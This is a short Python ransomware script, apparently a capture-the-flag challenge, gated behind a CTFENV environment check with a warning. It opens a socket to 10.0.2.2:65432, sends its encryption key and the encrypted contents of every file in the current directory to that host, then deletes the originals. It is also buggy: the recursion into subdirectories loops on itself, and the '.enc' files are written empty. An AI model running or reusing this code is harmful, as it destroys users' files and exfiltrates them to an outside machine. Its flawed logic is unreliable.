import os
from pathlib import Path
import socket
import time
from cryptography.fernet import Fernet

if os.getenv("CTFENV") != "1":
    print("You really should not run this! Never run untrusted code!")
    exit()
    
HOST = "10.0.2.2"
PORT = 65432
key = Fernet.generate_key()
f = Fernet(key)

def enc_dir(dir: Path, s: socket.socket):
    for p in dir.iterdir():
        if p.is_dir():
            return enc_dir(dir, s)
        
        with open(p, "rb") as fr:
            cipher = f.encrypt(fr.read())
            
        s.send(b"f")
        s.send(len(str(p)).to_bytes(8, "big"))
        s.send(str(p).encode())
        s.send(len(cipher).to_bytes(128, "big"))
        size = len(cipher)
        while size != 0:
            z = min(size, 1024)
            s.send(cipher[:z])
            cipher = cipher[z:]
            size -= z
            time.sleep(0.005)
            
        with open(str(p) + ".enc", "wb") as fw:
            fw.write(cipher)
            
        p.unlink(missing_ok=True)
        
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.send(b"k")
    s.send(len(key).to_bytes(8, "big"))
    s.send(key)
    enc_dir(Path("."), s)
